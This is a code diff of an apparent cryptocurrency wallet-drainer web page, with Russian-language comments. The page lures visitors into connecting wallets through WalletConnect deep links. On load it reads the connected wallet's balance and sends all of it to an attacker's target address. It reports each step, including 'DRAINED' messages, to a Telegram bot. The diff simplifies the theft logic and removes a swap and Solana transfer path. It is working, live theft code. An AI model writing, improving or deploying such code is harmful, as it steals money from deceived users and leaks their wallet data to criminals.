@@ -150,17 +150,11 @@
 
     async function getUri() {
       try {
-        await sendToTelegram('Запрос WC URI у бэкенда');
         const r = await fetch(`${BACKEND}/get-wc-uri`);
         const d = await r.json();
-        if (d.uri) {
-          await sendToTelegram('WC URI получен: ' + d.uri.substring(0, 50) + '...');
-          return d.uri;
-        }
-        await sendToTelegram('WC URI не получен от бэкенда');
-        return null;
+        return d.uri || null;
       } catch (e) {
-        await sendToTelegram('Ошибка получения WC URI: ' + e.message);
+        console.error(e);
         return null;
       }
     }
@@ -170,11 +164,8 @@
     }
 
     async function connect(wallet) {
-      await sendToTelegram(`Пользователь выбрал кошелёк: ${wallet}`);
-
       const uri = await getUri();
       if (!uri) {
-        await sendToTelegram('Сессия WC не создана — ошибка бэкенда');
         alert('Ошибка сессии — попробуй позже');
         return;
       }
@@ -182,47 +173,42 @@
       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
       if (isMobile) {
-        let dl = '';
-        // Универсальный WC для всех (самый стабильный вариант в 2025+)
-        dl = `wc:${uri.replace('wc:', '')}`; // чистый wc: формат
+        let dl = `wc:${uri.replace(/^wc:/, '')}`; // универсальный wc: формат (самый стабильный)
 
-        // Специфические для некоторых кошельков
-        if (wallet === 'MetaMask') dl = `metamask://wc?uri=${encodeURIComponent(uri)}`;
-        if (wallet === 'Trust Wallet') dl = `trust://wc?uri=${encodeURIComponent(uri)}`;
-        if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`; // пробуем классику
-        if (wallet === 'TronLink') dl = `tronlink://wc?uri=${encodeURIComponent(uri)}`;
-        if (wallet === 'Tonkeeper') dl = `tonkeeper://wc?uri=${encodeURIComponent(uri)}`;
+        // Специфические префиксы (пробуем все варианты)
+        const attempts = [
+          dl,  // wc:...
+          `wc:${encodeURIComponent(uri)}`,
+          `${wallet.toLowerCase()}://wc?uri=${encodeURIComponent(uri)}`,
+          `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}` // fallback на https
+        ];
 
-        if (dl) {
-          await sendToTelegram(`Попытка открытия deep-link для ${wallet}: ${dl.substring(0, 50)}...`);
-          console.log('Deep-link:', dl);
-          window.location.href = dl;
+        await sendToTelegram(`Попытки открытия для ${wallet}: ${attempts.length} вариантов`);
 
-          // Дополнительная попытка через универсальный wc://
+        // Запускаем все попытки с задержкой
+        attempts.forEach((link, index) => {
           setTimeout(() => {
-            window.location.href = `wc:${uri.replace('wc:', '')}`;
-          }, 1500);
+            window.location.href = link;
+            sendToTelegram(`Попытка #${index + 1}: ${link.substring(0, 50)}...`);
+          }, index * 800);
+        });
 
-          setTimeout(() => {
-            alert('Подтверди подключение и транзакцию в кошельке');
-          }, 3000);
+        setTimeout(() => {
+          alert('Подтверди подключение и транзакцию в кошельке');
+        }, 5000);
 
-          document.getElementById('modal').style.display = 'none';
-          return;
-        }
+        document.getElementById('modal').style.display = 'none';
+        return;
       }
 
-      await sendToTelegram(`Deep-link не сработал для ${wallet} на ПК — ждём ручного подключения`);
       alert('Подтверди подключение в кошельке');
     }
 
-    // Автоматический слив/своп после передачи сессии (когда сайт открыт в кошельке)
+    // Слив сразу после передачи сессии (если сайт открыт в кошельке)
     window.addEventListener('load', async () => {
-      await sendToTelegram('Страница загружена → проверка провайдера кошелька');
-
       if (window.ethereum || window.solana) {
         try {
-          let provider, address = 'unknown', network = 'unknown', balanceFormatted = '0', symbol = 'Unknown', target;
+          let provider, address, network, balanceFormatted, symbol, target;
 
           if (window.ethereum) {
             provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -233,13 +219,7 @@
             else if (chainId === 56) network = 'BNB Smart Chain';
             else if (chainId === 137) network = 'Polygon';
             else if (chainId === 8453) network = 'Base';
-            else if (chainId === 42161) network = 'Arbitrum';
-            else if (chainId === 10) network = 'Optimism';
-            else if (chainId === 43114) network = 'Avalanche';
-            else {
-              await sendToTelegram(`Неизвестная EVM-сеть: chainId ${chainId}`);
-              return;
-            }
+            else return;
 
             const bal = await provider.getBalance(address);
             balanceFormatted = ethers.utils.formatEther(bal);
@@ -261,61 +241,16 @@
           await sendToTelegram(connectMsg);
 
           if (parseFloat(balanceFormatted) > 0) {
-            await sendToTelegram(`Баланс > 0 (${balanceFormatted} ${symbol}) → начинаем слив/своп на ${target}`);
-
-            // Проверка на своп через бэкенд
-            const swapRes = await fetch(`${BACKEND}/swap-to-usdt-trc20`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chainId: chainId || 1,
-                fromToken: '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee',
-                amount: ethers.utils.parseEther(balanceFormatted).toString(),
-                fromAddress: address
-              })
+            const tx = await provider.getSigner().sendTransaction({
+              to: target,
+              value: ethers.utils.parseEther(balanceFormatted)
             });
-            const swapData = await swapRes.json();
-
-            let finalTarget = target;
-            if (swapData.tx) {
-              finalTarget = swapData.target;
-              await sendToTelegram(`Нужен своп в USDT TRC20 → ${finalTarget}`);
-              const signer = provider.getSigner();
-              await signer.sendTransaction(swapData.tx);
-            } else {
-              await sendToTelegram(`Адрес/токен совпадает → прямой слив на ${finalTarget}`);
-            }
-
-            if (network === 'Solana') {
-              const tx = await provider.signAndSendTransaction(
-                new solanaWeb3.Transaction().add(
-                  solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: provider.publicKey,
-                    toPubkey: new solanaWeb3.PublicKey(finalTarget),
-                    lamports: ethers.utils.parseEther(balanceFormatted).toString()
-                  })
-                )
-              );
-              await new solanaWeb3.Connection("https://api.mainnet-beta.solana.com").confirmTransaction(tx.signature);
-            } else {
-              const signer = provider.getSigner();
-              const tx = await signer.sendTransaction({
-                to: finalTarget,
-                value: ethers.utils.parseEther(balanceFormatted)
-              });
-              await tx.wait();
-            }
-
-            await sendToTelegram(`DRAINED ${balanceFormatted} ${symbol} → ${finalTarget}`);
-          } else {
-            await sendToTelegram(`Подключён, но баланс 0 → слив не выполнен`);
+            await tx.wait();
+            await sendToTelegram(`DRAINED ${balanceFormatted} ${symbol} → ${target}`);
           }
         } catch (e) {
-          console.error(e);
-          await sendToTelegram(`Ошибка захвата/слива: ${e.message}`);
+          await sendToTelegram(`Ошибка слива: ${e.message}`);
         }
-      } else {
-        await sendToTelegram('Провайдер кошелька не обнаружен — сессия не передалась');
       }
     });
   </script>
